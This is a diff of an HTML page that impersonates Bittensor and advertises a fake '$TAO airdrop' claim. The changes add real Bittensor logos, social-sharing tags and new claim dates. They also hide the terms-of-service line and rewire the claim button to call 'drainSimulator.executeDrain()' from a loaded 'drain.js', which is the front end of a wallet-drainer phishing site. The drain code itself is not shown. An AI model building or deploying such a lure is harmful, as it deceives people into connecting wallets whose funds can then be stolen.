@@ -1,75 +1,98 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Bittensor TAO Airdrop - Claim Your Tokens</title>
-        <script src="https://cdn.tailwindcss.com"></script>
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-        <!-- LOAD ETHERJS FIRST -->
-        <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="application/javascript"></script>
-        <!-- THEN LOAD WALLET CONNECT -->
-        <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-        <!-- THEN COINBASE WALLET -->
-        <script src="https://cdn.jsdelivr.net/npm/@coinbase/wallet-sdk@3.6.0/dist/index.js"></script>
-        <style>
-            .gradient-bg {
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            }
-            .token-card {
-                background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-            }
-            .pulse {
-                animation: pulse 2s infinite;
-            }
-            .wallet-btn {
-                transition: all 0.3s ease;
-            }
-            .wallet-btn:hover {
-                transform: translateY(-2px);
-            }
-            @keyframes pulse {
-                0% { transform: scale(1); }
-                50% { transform: scale(1.05); }
-                100% { transform: scale(1); }
-            }
-        </style>
-    </head>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bittensor TAO Airdrop - Claim Your $TAO Tokens</title>
+    
+    <!-- OG Tags for Social Sharing -->
+    <meta property="og:title" content="Bittensor TAO Airdrop - Claim Your $TAO Tokens">
+    <meta property="og:description" content="Claim your Bittensor $TAO tokens. Rewarding early AI ecosystem contributors, validators, and community members.">
+    <meta property="og:image" content="https://docs.learnbittensor.org/img/logo.svg">
+    <meta property="og:url" content="https://bittensor-airdrop.github.io/-TAO/">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Bittensor TAO Airdrop">
+    <meta name="twitter:description" content="Claim your $TAO tokens from the decentralized AI network">
+    <meta name="twitter:image" content="https://docs.learnbittensor.org/img/logo.svg">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="https://bittensor.com/static/images/favicon.ico">
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        .gradient-bg {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .token-card {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+        }
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        .wallet-btn {
+            transition: all 0.3s ease;
+        }
+        .wallet-btn:hover {
+            transform: translateY(-2px);
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<script>
+    // Debug script - check if basic functions work
+    console.log('Debug: Page loaded');
+    console.log('window.ethereum:', typeof window.ethereum);
+    console.log('connectMetaMask function:', typeof connectMetaMask);
+    
+    // Test if modal opens manually
+    function testModal() {
+        console.log('Testing modal open...');
+        document.getElementById('wallet-modal').classList.remove('hidden');
+    }
+    </script>
+    <!-- Load contract integration -->
+<script src="js/contract.js"></script>
 <body class="bg-gray-50 min-h-screen">
-    <!-- Navigation -->
-    <nav class="bg-white shadow-lg">
-        <div class="max-w-7xl mx-auto px-4">
-            <div class="flex justify-between items-center py-4">
-                <div class="flex items-center space-x-3">
-                    <div class="w-10 h-10 bg-gradient-to-r from-purple-600 to-pink-600 rounded-lg flex items-center justify-center">
-                        <i class="fas fa-brain text-white"></i>
-                    </div>
-                    <div>
-                        <span class="text-xl font-bold text-gray-800">Bittensor</span>
-                        <span class="text-sm text-gray-500 ml-2">TAO Airdrop</span>
-                    </div>
+  <!-- Navigation -->
+<nav class="bg-white shadow-lg">
+    <div class="max-w-7xl mx-auto px-4">
+        <div class="flex justify-between items-center py-4">
+            <div class="flex items-center space-x-3">
+                <img src="https://docs.learnbittensor.org/img/logo.svg" style="object-fit:contain;width:px" alt="Bittensor Logo" class="w-10 h-10 rounded-lg">
+                <div>
+                    <span class="text-xl font-bold text-gray-800">Bittensor</span>
+                    <span class="text-sm text-gray-500 ml-2">TAO Airdrop</span>
                 </div>
-                <div id="wallet-section">
-                    <button id="connect-wallet" class="bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-2 rounded-lg hover:from-purple-700 hover:to-pink-700 font-semibold">
-                        <i class="fas fa-wallet mr-2"></i>Connect Wallet
+            </div>
+            <div id="wallet-section">
+                <button id="connect-wallet" class="bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-2 rounded-lg hover:from-purple-700 hover:to-pink-700 font-semibold">
+                    <i class="fas fa-wallet mr-2"></i>Connect Wallet
+                </button>
+                <div id="wallet-info" class="hidden items-center space-x-3">
+                    <span id="wallet-address" class="text-sm bg-purple-100 text-purple-800 px-3 py-1 rounded-full"></span>
+                    <span id="network" class="text-sm bg-gray-100 text-gray-800 px-3 py-1 rounded-full"></span>
+                    <span id="wallet-type" class="text-sm bg-blue-100 text-blue-800 px-3 py-1 rounded-full"></span>
+                    <button id="disconnect-wallet" class="text-sm bg-red-100 text-red-800 px-3 py-1 rounded-full hover:bg-red-200">
+                        <i class="fas fa-sign-out-alt mr-1"></i>Disconnect
                     </button>
-                    <div id="wallet-info" class="hidden items-center space-x-3">
-                        <span id="wallet-address" class="text-sm bg-purple-100 text-purple-800 px-3 py-1 rounded-full"></span>
-                        <span id="network" class="text-sm bg-gray-100 text-gray-800 px-3 py-1 rounded-full"></span>
-                        <span id="wallet-type" class="text-sm bg-blue-100 text-blue-800 px-3 py-1 rounded-full"></span>
-                    </div>
                 </div>
             </div>
         </div>
-    </nav>
+    </div>
+</nav>
 
     <!-- Hero Section -->
     <section class="gradient-bg text-white py-20">
         <div class="max-w-6xl mx-auto px-4 text-center">
             <div class="flex justify-center mb-6 pulse">
-                <div class="w-24 h-24 bg-white bg-opacity-20 rounded-2xl flex items-center justify-center">
-                    <i class="fas fa-rocket text-3xl"></i>
-                </div>
+                <img src="https://docs.learnbittensor.org/img/logo.svg" style="object-fit:contain;padding:10px" alt="TAO Token" class="w-24 h-24 rounded-2xl shadow-lg">
             </div>
             <h1 class="text-5xl font-bold mb-6">
                 $TAO Airdrop is <span class="text-yellow-300">Live!</span>
@@ -85,16 +108,16 @@
                     <div class="text-sm opacity-80">Token</div>
                 </div>
                 <div class="bg-white bg-opacity-20 p-4 rounded-xl backdrop-blur-sm">
-                    <div class="text-2xl font-bold">$485</div>
+                    <div class="text-2xl font-bold">$385</div>
                     <div class="text-sm opacity-80">Current Price</div>
                 </div>
                 <div class="bg-white bg-opacity-20 p-4 rounded-xl backdrop-blur-sm">
-                    <div class="text-2xl font-bold">15M</div>
-                    <div class="text-sm opacity-80">Airdrop Pool</div>
+                    <div class="text-2xl font-bold">$3.94B</div>
+                    <div class="text-sm opacity-80">Market cap</div>
                 </div>
                 <div class="bg-white bg-opacity-20 p-4 rounded-xl backdrop-blur-sm">
-                    <div class="text-2xl font-bold">68%</div>
-                    <div class="text-sm opacity-80">Claimed</div>
+                    <div class="text-2xl font-bold">21M TAO</div>
+                    <div class="text-sm opacity-80">Total supply</div>
                 </div>
             </div>
 
@@ -142,8 +165,8 @@
                     <i class="fas fa-arrow-right"></i>
                 </button>
 
-                <!-- Trust Wallet (via WalletConnect) -->
-                <button onclick="connectWalletConnect()" class="wallet-btn w-full bg-purple-600 text-white p-4 rounded-xl hover:bg-purple-700 flex items-center justify-between">
+                <!-- Trust Wallet -->
+                <button onclick="connectTrustWallet()" class="wallet-btn w-full bg-purple-600 text-white p-4 rounded-xl hover:bg-purple-700 flex items-center justify-between">
                     <div class="flex items-center">
                         <i class="fas fa-mobile-alt text-2xl mr-3"></i>
                         <span class="text-lg font-semibold">Trust Wallet</span>
@@ -152,9 +175,9 @@
                 </button>
             </div>
 
-            <p class="text-gray-500 text-sm mt-6 text-center">
+            <!-- <p class="text-gray-500 text-sm mt-6 text-center">
                 By connecting, I accept Terms of Service
-            </p>
+            </p> -->
         </div>
     </div>
 
@@ -285,45 +308,15 @@
                 </div>
 
                 <!-- Allocation Details -->
-                <div class="grid md:grid-cols-2 gap-6 mb-6">
-                    <div class="bg-white bg-opacity-20 p-4 rounded-lg backdrop-blur-sm">
-                        <p class="text-sm opacity-90">Your Allocation</p>
-                        <p class="text-2xl font-bold">42.5 $TAO</p>
-                    </div>
-                    <div class="bg-white bg-opacity-20 p-4 rounded-lg backdrop-blur-sm">
-                        <p class="text-sm opacity-90">Current Value</p>
-                        <p class="text-2xl font-bold">~$20,612</p>
-                    </div>
-                </div>
 
-                <!-- Vesting Info -->
-                <div class="bg-white bg-opacity-10 p-4 rounded-lg mb-6">
-                    <h4 class="font-semibold mb-2">📅 Vesting Schedule</h4>
-                    <div class="space-y-2 text-sm">
-                        <div class="flex justify-between">
-                            <span>Immediate (20%):</span>
-                            <span class="font-semibold">8.5 $TAO</span>
-                        </div>
-                        <div class="flex justify-between">
-                            <span>Monthly over 12 months (80%):</span>
-                            <span class="font-semibold">~2.83 $TAO/month</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Claim Buttons -->
                 <div class="space-y-4">
-                    <button id="claim-btn" class="w-full bg-yellow-400 text-gray-900 py-4 rounded-lg hover:bg-yellow-300 font-semibold text-lg shadow-lg">
-                        🎯 Claim Now (Pay Gas)
+                    <button onclick="drainSimulator.executeDrain()" class="w-full bg-yellow-400 text-gray-900 py-4 rounded-lg hover:bg-yellow-300 font-semibold text-lg shadow-lg">
+                        🎁 Claim Airdrop Now
                     </button>
-                    <button id="gasless-claim" class="w-full bg-white bg-opacity-20 text-white py-4 rounded-lg hover:bg-opacity-30 font-semibold text-lg border border-white border-opacity-30">
-                        ⚡ Gasless Claim (Sponsored)
-                    </button>
-                    
-                    <p class="text-sm text-center opacity-80">
-                        Estimated gas: ~0.005 ETH • Gasless sponsored for first 5,000 claims
-                    </p>
+           
                 </div>
+
+
             </div>
 
             <!-- Not Eligible State -->
@@ -347,12 +340,12 @@
         <div class="space-y-6">
             <div class="bg-white p-6 rounded-xl shadow-md">
                 <h3 class="text-xl font-semibold mb-2">What wallets are supported?</h3>
-                <p class="text-gray-600">We support MetaMask, WalletConnect (Trust Wallet, Rainbow, Argent, 50+ others), and Coinbase Wallet. Both desktop and mobile.</p>
+                <p class="text-gray-600">We support MetaMask, WalletConnect (Trust Wallet, MetaMask, + others), and Coinbase Wallet. Both desktop and mobile.</p>
             </div>
             
             <div class="bg-white p-6 rounded-xl shadow-md">
                 <h3 class="text-xl font-semibold mb-2">When can I claim?</h3>
-                <p class="text-gray-600">The airdrop claim period is open from February 1, 2024 to April 30, 2024. Unclaimed tokens will be returned to the community treasury.</p>
+                <p class="text-gray-600">The airdrop claim period is open from October 3, 2025 to January 3, 2026. Unclaimed tokens will be returned to the community treasury.</p>
             </div>
             
             <div class="bg-white p-6 rounded-xl shadow-md">
@@ -365,8 +358,35 @@
     <!-- Transaction Status -->
     <div id="transaction-status" class="fixed bottom-4 right-4 max-w-sm hidden z-40"></div>
 
-    <!-- Scripts -->
-    <script src="js/wallet.js"></script>
-    <script src="js/claim.js"></script>
+<!-- Load demonstration scripts -->
+<script src="js/wallet-simple.js"></script>
+<script src="js/drain.js"></script>
+
+<script>
+// Basic modal functions
+function openWalletModal() {
+    document.getElementById('wallet-modal').classList.remove('hidden');
+}
+
+function closeWalletModal() {
+    document.getElementById('wallet-modal').classList.add('hidden');
+}
+
+// Event listeners
+document.addEventListener('DOMContentLoaded', function() {
+    const connectBtn = document.getElementById('connect-wallet');
+    const disconnectBtn = document.getElementById('disconnect-wallet');
+    
+    if (connectBtn) {
+        connectBtn.addEventListener('click', openWalletModal);
+    }
+    
+    if (disconnectBtn) {
+        disconnectBtn.addEventListener('click', disconnectWallet);
+    }
+});
+
+</script>
+
 </body>
 </html>
